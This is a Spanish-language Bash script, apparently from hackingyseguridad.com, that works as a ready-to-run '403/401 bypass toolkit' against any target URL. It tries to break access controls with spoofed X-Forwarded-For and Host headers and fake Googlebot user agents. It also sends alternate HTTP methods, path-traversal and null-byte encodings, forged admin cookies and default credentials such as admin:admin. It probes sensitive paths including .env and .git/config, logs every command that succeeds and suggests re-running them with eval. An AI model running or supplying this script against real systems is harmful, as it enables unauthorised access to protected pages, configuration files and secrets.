#!/bin/bash
# ============================================================
# 403/401 BYPASS TOOLKIT v5.0 - CON TIMEOUTS INTELIGENTES
# hackingyseguridad.com 2026
# ============================================================

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'
WHITE='\033[1;37m'
MAGENTA='\033[0;35m'

# Configuración de timeouts (en segundos)
CONNECT_TIMEOUT=5      # Timeout de conexión
MAX_TIME=10            # Tiempo máximo total por prueba
RETRY_DELAY=1          # Delay entre pruebas
GLOBAL_TIMEOUT=9       # Timeout global para cada curl

# Configuración
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
OUTPUT_FILE="bypass_results_$(date +%Y%m%d_%H%M%S).txt"
SUCCESS_FILE="curl_commands_200ok.txt"
CURL_COMMANDS_FILE="comandos_curl_completos.txt"
ERROR_LOG="errores_$(date +%Y%m%d_%H%M%S).log"

# Inicializar archivos
> "$SUCCESS_FILE"
> "$CURL_COMMANDS_FILE"
> "$ERROR_LOG"

# Contadores
TOTAL_TESTS=0
SUCCESS_TESTS=0
FAILED_TESTS=0
TIMEOUT_TESTS=0

# Función para colorear según status code
color_status() {
    local code=$1
    case $code in
        200|201|202|204) echo -e "${GREEN}${BOLD}$code${NC}" ;;
        301|302|303|307|308) echo -e "${BLUE}${BOLD}$code${NC}" ;;
        400|401|403|404|405|407) echo -e "${RED}${BOLD}$code${NC}" ;;
        500|502|503|504) echo -e "${YELLOW}${BOLD}$code${NC}" ;;
        *) echo -e "${WHITE}$code${NC}" ;;
    esac
}

# Función para probar con timeout y manejo de errores
test_bypass_with_timeout() {
    local url=$1
    local description=$2
    local extra_headers=$3
    local auth=$4
    local method=${5:-"GET"}
    local data=$6

    TOTAL_TESTS=$((TOTAL_TESTS + 1))

    echo -e "${PURPLE}[*]${NC} [$TOTAL_TESTS] Probando: $description"

    # Construir comando curl CON TIMEOUTS
    local curl_cmd="curl -k -L --max-redirs 10"
    curl_cmd="$curl_cmd --connect-timeout $CONNECT_TIMEOUT"
    curl_cmd="$curl_cmd --max-time $MAX_TIME"
    curl_cmd="$curl_cmd --retry 1"
    curl_cmd="$curl_cmd --retry-delay 1"

    if [ "$method" != "GET" ]; then
        curl_cmd="$curl_cmd -X $method"
    fi

    curl_cmd="$curl_cmd -H 'User-Agent: $USER_AGENT'"

    if [ -n "$extra_headers" ]; then
        curl_cmd="$curl_cmd $extra_headers"
    fi

    if [ -n "$auth" ]; then
        curl_cmd="$curl_cmd $auth"
    fi

    if [ -n "$data" ]; then
        curl_cmd="$curl_cmd -d '$data'"
    fi

    curl_cmd="$curl_cmd \"$url\""

    # Ejecutar con timeout GLOBAL usando timeout command
    local full_response=""
    local exit_code=0
    local status_code=""

    # Usar timeout de sistema para asegurar que no cuelgue
    full_response=$(timeout $GLOBAL_TIMEOUT bash -c "$curl_cmd -s -w '\n\n%{http_code}\n%{content_type}\n%{size_download}\n%{time_total}'" 2>&1)
    exit_code=$?

    # Verificar si hubo timeout
    if [ $exit_code -eq 124 ]; then
        echo -e "${YELLOW}  ⏰ TIMEOUT (${GLOBAL_TIMEOUT}s) - $description${NC}"
        TIMEOUT_TESTS=$((TIMEOUT_TESTS + 1))
        echo "TIMEOUT: $description - $url" >> "$ERROR_LOG"
        sleep $RETRY_DELAY
        return 1
    fi

    # Verificar otros errores
    if [ $exit_code -ne 0 ]; then
        echo -e "${RED}  ❌ ERROR ($exit_code) - $description${NC}"
        FAILED_TESTS=$((FAILED_TESTS + 1))
        echo "ERROR $exit_code: $description - $url" >> "$ERROR_LOG"
        echo "$full_response" >> "$ERROR_LOG"
        sleep $RETRY_DELAY
        return 1
    fi

    # Extraer información
    status_code=$(echo "$full_response" | tail -4 | head -1 | tr -d ' \n\r')
    content_type=$(echo "$full_response" | tail -3 | head -1)
    size=$(echo "$full_response" | tail -2 | head -1)
    time=$(echo "$full_response" | tail -1)
    body=$(echo "$full_response" | head -n -4)

    # Si no hay status code, asumir error
    if [ -z "$status_code" ] || [ "$status_code" = "" ]; then
        echo -e "${RED}  ❌ Sin respuesta - $description${NC}"
        FAILED_TESTS=$((FAILED_TESTS + 1))
        sleep $RETRY_DELAY
        return 1
    fi

    # Mostrar resultado
    local color_status=$(color_status "$status_code")
    echo -e "  → Status: $color_status | Tipo: $content_type | Tamaño: ${size}B | Tiempo: ${time}s"

    # Si es 200 OK o cualquier éxito
    if [ "$status_code" = "200" ] || [ "$status_code" = "201" ] || [ "$status_code" = "202" ] || [ "$status_code" = "204" ]; then
        SUCCESS_TESTS=$((SUCCESS_TESTS + 1))
        echo -e "${GREEN}${BOLD}  ✅ ¡EXITO! - $status_code OK Encontrado${NC}"
        echo ""
        echo -e "${CYAN}${BOLD}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${WHITE}${BOLD}  📋 COMANDO CURL COMPLETO (CON TIMEOUTS):${NC}"
        echo -e "${YELLOW}  $curl_cmd${NC}"
        echo -e "${CYAN}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${WHITE}  📄 PRIMERAS LÍNEAS DE RESPUESTA:${NC}"
        echo "$body" | head -5 | sed 's/^/  /'
        echo -e "${CYAN}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo ""

        # Guardar en archivos
        echo "========================================" >> "$OUTPUT_FILE"
        echo "✅ SUCCESS $status_code OK: $description" >> "$OUTPUT_FILE"
        echo "URL: $url" >> "$OUTPUT_FILE"
        echo "Status: $status_code" >> "$OUTPUT_FILE"
        echo "Content-Type: $content_type" >> "$OUTPUT_FILE"
        echo "Tamaño: $size bytes" >> "$OUTPUT_FILE"
        echo "Tiempo: $time segundos" >> "$OUTPUT_FILE"
        echo "Comando: $curl_cmd" >> "$OUTPUT_FILE"
        echo "Respuesta (primeras líneas):" >> "$OUTPUT_FILE"
        echo "$body" | head -10 >> "$OUTPUT_FILE"
        echo "========================================" >> "$OUTPUT_FILE"

        # Guardar comando en archivo especial de 200 OK
        echo "# $status_code OK - $description" >> "$SUCCESS_FILE"
        echo "$curl_cmd" >> "$SUCCESS_FILE"
        echo "# Status: $status_code | Tipo: $content_type | Tamaño: ${size}B" >> "$SUCCESS_FILE"
        echo "" >> "$SUCCESS_FILE"

        # Guardar TODOS los comandos curl en un archivo
        echo "# $description → $status_code" >> "$CURL_COMMANDS_FILE"
        echo "$curl_cmd" >> "$CURL_COMMANDS_FILE"
        echo "" >> "$CURL_COMMANDS_FILE"

        sleep $RETRY_DELAY
        return 0

    # Si es redirección
    elif [ "$status_code" = "301" ] || [ "$status_code" = "302" ] || [ "$status_code" = "307" ]; then
        local location=$(echo "$body" | grep -i "location:" | head -1)
        if [ -n "$location" ]; then
            echo -e "${BLUE}  ↪ Redirección a: ${location#*: }${NC}"
        fi

    # Si es 401/403
    elif [ "$status_code" = "401" ]; then
        echo -e "${RED}  🔒 Requiere autenticación${NC}"
    elif [ "$status_code" = "403" ]; then
        echo -e "${RED}  🚫 Acceso prohibido${NC}"
    elif [ "$status_code" = "404" ]; then
        echo -e "${RED}  📁 No encontrado${NC}"
    elif [ "$status_code" = "500" ] || [ "$status_code" = "502" ] || [ "$status_code" = "503" ]; then
        echo -e "${YELLOW}  ⚠️ Error del servidor $status_code${NC}"
    fi

    # Guardar resultados intermedios
    echo "$description|$url|$status_code|$content_type|$size|$time" >> "resultados_temp.txt" 2>/dev/null || true

    sleep $RETRY_DELAY
    return 1
}

# Función para probar con múltiples variantes de una ruta
test_ruta_completa() {
    local base_url=$1
    local ruta=$2

    echo -e "\n${BOLD}${CYAN}▶ Probando ruta: /$ruta${NC}"

    # Variantes de la misma ruta
    test_bypass_with_timeout "$base_url/$ruta" "/$ruta (normal)"
    test_bypass_with_timeout "$base_url/$ruta/" "/$ruta/ (con slash)"
    test_bypass_with_timeout "$base_url//$ruta" "//$ruta (doble slash)"
    test_bypass_with_timeout "$base_url/$ruta%2f" "/$ruta%2f (codificado)"
    test_bypass_with_timeout "$base_url/$ruta/." "/$ruta/. (con punto)"
    test_bypass_with_timeout "$base_url/$ruta/.." "/$ruta/.. (path traversal)"
}

# Función para mostrar progreso
show_progress() {
    local current=$1
    local total=$2
    local percent=$((current * 100 / total))
    local bar_length=50
    local filled=$((percent * bar_length / 100))
    local empty=$((bar_length - filled))

    printf "\r${CYAN}Progreso: ["
    printf "%${filled}s" | tr ' ' '█'
    printf "%${empty}s" | tr ' ' '░'
    printf "] %d%% (%d/%d)" $percent $current $total
}

# ============================================================
# MAIN
# ============================================================

if [ -z "$1" ]; then
    echo -e "${BOLD}Uso:${NC} $0 <URL> [opciones]"
    echo -e "Ejemplo: $0 https://v1-yw.dof5.com/"
    echo -e "Ejemplo: $0 https://ejemplo.com/admin"
    echo ""
    echo -e "${BOLD}Opciones:${NC}"
    echo -e "  -r, --ruta <path>   Probar una ruta específica"
    echo -e "  -t, --timeout <s>   Timeout global (defecto: 2s)"
    echo -e "  -c, --conexion <s>  Timeout de conexión (defecto: 5s)"
    echo -e "  -m, --max <s>       Tiempo máximo por prueba (defecto: 10s)"
    echo -e "  -d, --delay <s>     Delay entre pruebas (defecto: 1s)"
    echo -e "  -v, --verbose       Modo verbose"
    echo -e "  -h, --help          Mostrar esta ayuda"
    exit 1
fi

TARGET_URL="${1%/}"
shift

# Procesar opciones
RUTA_ESPECIFICA=""
VERBOSE=0

while [[ $# -gt 0 ]]; do
    case $1 in
        -r|--ruta)
            RUTA_ESPECIFICA="$2"
            shift 2
            ;;
        -t|--timeout)
            GLOBAL_TIMEOUT="$2"
            shift 2
            ;;
        -c|--conexion)
            CONNECT_TIMEOUT="$2"
            shift 2
            ;;
        -m|--max)
            MAX_TIME="$2"
            shift 2
            ;;
        -d|--delay)
            RETRY_DELAY="$2"
            shift 2
            ;;
        -v|--verbose)
            VERBOSE=1
            shift
            ;;
        -h|--help)
            echo "Ayuda..."
            exit 0
            ;;
        *)
            echo "Opción desconocida: $1"
            exit 1
            ;;
    esac
done

# Banner
echo -e "${BOLD}${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${BLUE}║     403/401 BYPASS TOOLKIT v5.0 - CON TIMEOUTS          ║${NC}"
echo -e "${BOLD}${BLUE}║     hackingyseguridad.com 2026                          ║${NC}"
echo -e "${BOLD}${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${WHITE}🎯 Target:${NC} $TARGET_URL"
echo -e "${WHITE}⏰ Timeout global:${NC} ${GLOBAL_TIMEOUT}s"
echo -e "${WHITE}⏰ Timeout conexión:${NC} ${CONNECT_TIMEOUT}s"
echo -e "${WHITE}⏰ Tiempo máximo:${NC} ${MAX_TIME}s"
echo -e "${WHITE}⏱️  Delay entre pruebas:${NC} ${RETRY_DELAY}s"
echo -e "${WHITE}📁 Archivo de resultados:${NC} $OUTPUT_FILE"
echo -e "${WHITE}📋 Comandos 200 OK:${NC} $SUCCESS_FILE"
echo -e "${WHITE}📋 Todos los comandos:${NC} $CURL_COMMANDS_FILE"
echo -e "${WHITE}📋 Errores:${NC} $ERROR_LOG"
echo ""

# ============================================================
# INICIO DE PRUEBAS
# ============================================================

echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${CYAN}         INICIANDO PRUEBAS CON TIMEOUTS INTELIGENTES         ${NC}"
echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════════════${NC}"
echo ""

# Si se especificó una ruta, probar solo esa
if [ -n "$RUTA_ESPECIFICA" ]; then
    echo -e "${BOLD}${MAGENTA}▶ Probando ruta específica: /$RUTA_ESPECIFICA${NC}"
    test_ruta_completa "$TARGET_URL" "$RUTA_ESPECIFICA"
    exit 0
fi

# ============================================================
# LISTA DE PRUEBAS CON TIMEOUT
# ============================================================

# 1. Headers de spoofing
echo -e "\n${BOLD}${CYAN}══════ 1. HEADERS DE SPOOFING ══════${NC}"
echo ""

test_bypass_with_timeout "$TARGET_URL" "X-Forwarded-For: 127.0.0.1" "-H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1'"
test_bypass_with_timeout "$TARGET_URL" "X-Forwarded-For: localhost" "-H 'X-Forwarded-For: localhost'"
test_bypass_with_timeout "$TARGET_URL" "X-Originating-IP: 127.0.0.1" "-H 'X-Originating-IP: 127.0.0.1'"
test_bypass_with_timeout "$TARGET_URL" "X-Remote-IP: 127.0.0.1" "-H 'X-Remote-IP: 127.0.0.1'"
test_bypass_with_timeout "$TARGET_URL" "X-Client-IP: 127.0.0.1" "-H 'X-Client-IP: 127.0.0.1'"
test_bypass_with_timeout "$TARGET_URL" "Host: localhost" "-H 'Host: localhost'"
test_bypass_with_timeout "$TARGET_URL" "Host: 127.0.0.1" "-H 'Host: 127.0.0.1'"

# 2. User-Agent específicos
echo -e "\n${BOLD}${CYAN}══════ 2. USER-AGENT ESPECÍFICOS ══════${NC}"
echo ""

test_bypass_with_timeout "$TARGET_URL" "User-Agent: Googlebot" "-H 'User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)'"
test_bypass_with_timeout "$TARGET_URL" "User-Agent: Bingbot" "-H 'User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'"
test_bypass_with_timeout "$TARGET_URL" "User-Agent: iPhone" "-H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'"
test_bypass_with_timeout "$TARGET_URL" "User-Agent: Android" "-H 'User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B)'"
test_bypass_with_timeout "$TARGET_URL" "User-Agent: curl" "-H 'User-Agent: curl/7.68.0'"

# 3. Verbos HTTP alternativos
echo -e "\n${BOLD}${CYAN}══════ 3. VERBOS HTTP ALTERNATIVOS ══════${NC}"
echo ""

test_bypass_with_timeout "$TARGET_URL" "Método POST" "" "" "POST"
test_bypass_with_timeout "$TARGET_URL" "Método HEAD" "" "" "HEAD"
test_bypass_with_timeout "$TARGET_URL" "Método OPTIONS" "" "" "OPTIONS"
test_bypass_with_timeout "$TARGET_URL" "Método PATCH" "" "" "PATCH"
test_bypass_with_timeout "$TARGET_URL" "Método PUT" "" "" "PUT"

# 4. RUTAS COMUNES
echo -e "\n${BOLD}${CYAN}══════ 4. RUTAS COMUNES ══════${NC}"
echo ""

RUTAS_COMUNES=(
    "admin" "panel" "login" "dashboard" "cpanel"
    "phpmyadmin" "wp-admin" "administrator" "user"
    "users" "account" "profile" "settings" "config"
    "api" "v1" "v2" "dev" "test" "backup"
    "temp" "tmp" "logs" "debug" "info"
    "status" "health" "ping" "robots.txt"
    "sitemap.xml" ".env" ".git/config" ".htaccess"
)

for ruta in "${RUTAS_COMUNES[@]}"; do
    test_ruta_completa "$TARGET_URL" "$ruta"
done

# 5. Path traversal y codificación
echo -e "\n${BOLD}${CYAN}══════ 5. PATH TRAVERSAL Y CODIFICACIÓN ══════${NC}"
echo ""

test_bypass_with_timeout "$TARGET_URL/%2f" "Slash codificado"
test_bypass_with_timeout "$TARGET_URL/..%2f" "Path traversal codificado"
test_bypass_with_timeout "$TARGET_URL/%2e%2e%2f" "Path traversal codificado v2"
test_bypass_with_timeout "$TARGET_URL/..%252f" "Path traversal doble codificado"
test_bypass_with_timeout "$TARGET_URL/%09" "Tab codificado"
test_bypass_with_timeout "$TARGET_URL/%20" "Espacio codificado"
test_bypass_with_timeout "$TARGET_URL/%00" "Null byte"
test_bypass_with_timeout "$TARGET_URL//" "Doble slash"
test_bypass_with_timeout "$TARGET_URL/./" "Path con punto"
test_bypass_with_timeout "$TARGET_URL/;/" "Path con punto y coma"

# 6. Query strings
echo -e "\n${BOLD}${CYAN}══════ 6. QUERY STRINGS ══════${NC}"
echo ""

test_bypass_with_timeout "$TARGET_URL?admin=true" "Query: admin=true"
test_bypass_with_timeout "$TARGET_URL?debug=1" "Query: debug=1"
test_bypass_with_timeout "$TARGET_URL?auth=bypass" "Query: auth=bypass"
test_bypass_with_timeout "$TARGET_URL?x=../" "Query: path traversal"
test_bypass_with_timeout "$TARGET_URL?redirect=/admin" "Query: redirect"
test_bypass_with_timeout "$TARGET_URL?page=admin" "Query: page=admin"

# 7. Cookies
echo -e "\n${BOLD}${CYAN}══════ 7. COOKIES ══════${NC}"
echo ""

test_bypass_with_timeout "$TARGET_URL" "Cookie: admin=1" "-H 'Cookie: admin=1'"
test_bypass_with_timeout "$TARGET_URL" "Cookie: auth=true" "-H 'Cookie: auth=true'"
test_bypass_with_timeout "$TARGET_URL" "Cookie: logged_in=1" "-H 'Cookie: logged_in=1'"
test_bypass_with_timeout "$TARGET_URL" "Cookie: session=admin" "-H 'Cookie: session=admin'"

# 8. Combinaciones avanzadas
echo -e "\n${BOLD}${CYAN}══════ 8. COMBINACIONES AVANZADAS ══════${NC}"
echo ""

test_bypass_with_timeout "$TARGET_URL" "IP Spoofing + Cookie admin" "-H 'X-Forwarded-For: 127.0.0.1' -H 'Cookie: admin=1'"
test_bypass_with_timeout "$TARGET_URL" "Googlebot + IP Spoofing" "-H 'User-Agent: Googlebot/2.1' -H 'X-Forwarded-For: 127.0.0.1'"

# 9. Autenticación básica
echo -e "\n${BOLD}${CYAN}══════ 9. AUTENTICACIÓN BÁSICA ══════${NC}"
echo ""

test_bypass_with_timeout "$TARGET_URL" "Basic Auth: admin/admin" "" "-u admin:admin"
test_bypass_with_timeout "$TARGET_URL" "Basic Auth: admin/password" "" "-u admin:password"
test_bypass_with_timeout "$TARGET_URL" "Basic Auth: root/root" "" "-u root:root"

# ============================================================
# RESULTADOS FINALES
# ============================================================

echo ""
echo -e "${BOLD}${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${BLUE}║                    RESUMEN FINAL                         ║${NC}"
echo -e "${BOLD}${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${WHITE}📊 Estadísticas:${NC}"
echo -e "  Total pruebas: ${BOLD}$TOTAL_TESTS${NC}"
echo -e "  ✅ Éxitos (200 OK): ${GREEN}${BOLD}$SUCCESS_TESTS${NC}"
echo -e "  ❌ Fallos: ${RED}${BOLD}$FAILED_TESTS${NC}"
echo -e "  ⏰ Timeouts: ${YELLOW}${BOLD}$TIMEOUT_TESTS${NC}"
echo ""

if [ -f "$SUCCESS_FILE" ] && [ -s "$SUCCESS_FILE" ]; then
    SUCCESS_COUNT=$(grep -c "^# [0-9]" "$SUCCESS_FILE")

    echo -e "${GREEN}${BOLD}✅ ¡SE ENCONTRARON $SUCCESS_COUNT URLS CON 200 OK!${NC}"
    echo ""
    echo -e "${WHITE}${BOLD}📋 COMANDOS CON 200 OK:${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    grep -A1 "^# [0-9]" "$SUCCESS_FILE" | grep -v "^--$" | while read -r line; do
        if [[ $line == \#* ]]; then
            echo -e "${GREEN}${line}${NC}"
        elif [[ -n $line ]]; then
            echo -e "${YELLOW}$line${NC}"
            echo ""
        fi
    done

    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "${WHITE}💡 Para ejecutar todos los comandos encontrados:${NC}"
    echo "  cat $SUCCESS_FILE | grep -v '^#' | grep -v '^$' | while read cmd; do eval \$cmd; done"

else
    echo -e "${YELLOW}${BOLD}⚠️ NO SE ENCONTRARON 200 OK${NC}"
    echo ""
    echo -e "${WHITE}Recomendaciones:${NC}"
    echo "1. Verifica que la URL sea accesible"
    echo "2. Prueba con diferentes User-Agents:"
    echo "   curl -k -A 'Googlebot' $TARGET_URL"
    echo "3. Escanea directorios:"
    echo "   gobuster dir -u $TARGET_URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k"
    echo "4. Prueba con credenciales:"
    echo "   curl -k -u admin:admin $TARGET_URL"
fi

echo ""
echo -e "${WHITE}📁 Archivos generados:${NC}"
echo "  ✅ Log completo: $OUTPUT_FILE"
echo "  ✅ Comandos 200 OK: $SUCCESS_FILE"
echo "  ✅ Todos los comandos: $CURL_COMMANDS_FILE"
echo "  ✅ Errores: $ERROR_LOG"
echo ""

echo -e "${BOLD}${BLUE}🔍 Script finalizado correctamente${NC}"

